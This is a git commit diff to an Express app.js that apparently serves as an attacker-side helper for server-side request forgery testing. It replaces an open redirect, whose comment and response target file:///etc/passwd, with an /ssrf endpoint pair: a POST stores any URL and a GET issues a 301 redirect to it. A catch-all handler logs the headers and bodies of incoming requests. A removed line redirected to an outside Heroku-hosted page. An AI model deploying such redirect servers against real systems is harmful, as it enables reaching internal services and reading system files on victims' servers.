e19e0a81cfa50132ece8e5e9d8fcf49c3059add2
Bohdan Pantiukhov <58185639+gingermanymph@users.noreply.github.com>
2021-03-10 20:01:35 +0200

    changed redirect for ssrf

--- app.js
+++ app.js
@@ -7,18 +7,34 @@ const app = express();
 
 const PORT = process.env.PORT || 808;
 
+
 app.use(bodyParser.urlencoded({ extended: false }));
 app.use(express.static(path.join(__dirname, 'public')));
 
+
 // Redirect via Location header
 // /r?r=file:///etc/passwd
-app.use('/r', (req, res, next) =>{
-    param = req.query['r']
-    console.log(req.query);
-    res.setHeader('Location', param)
+// app.get('/r', (req, res, next) =>{
+//     param = req.query['r']
+//     console.log(req.query);
+//     res.setHeader('Location', param)
+//     res.statusCode= 301;
+//     res.send('<embed src="file://etc/passwd" width="300" height="200">')
+//     //next();
+// });
+
+let temp = '/';
+
+app.get('/ssrf', (req, res, next) =>{
+    res.setHeader('Location', temp)
     res.statusCode= 301;
-    res.send('<embed src="file://etc/passwd" width="300" height="200">')
-    //next();
+    res.send()
+});
+
+app.post('/ssrf', (req, res, next) =>{
+    temp = req.body.data || '/';
+    console.log(temp);
+    res.send(`Saved ${temp}`)
 });
 
 app.use((req, res) => {
@@ -28,9 +44,7 @@ app.use((req, res) => {
     console.info('START-------------------------------------------------------------\n'+rMethod + ' ' + rUrl);
     console.info(rHeaders);
     console.info('BODY--------------------------------------------------------------\n'+JSON.stringify(req.body));
-    // res.statusCode = 301;
-    // res.setHeader('Location', 'https://srvcb.herokuapp.com/m0.html');
-    res.send('<embed src="file://etc/passwd" width="300" height="200">')
+    res.end(rUrl)
     console.info('END---------------------------------------------------------------\n\n\n');
 });
 
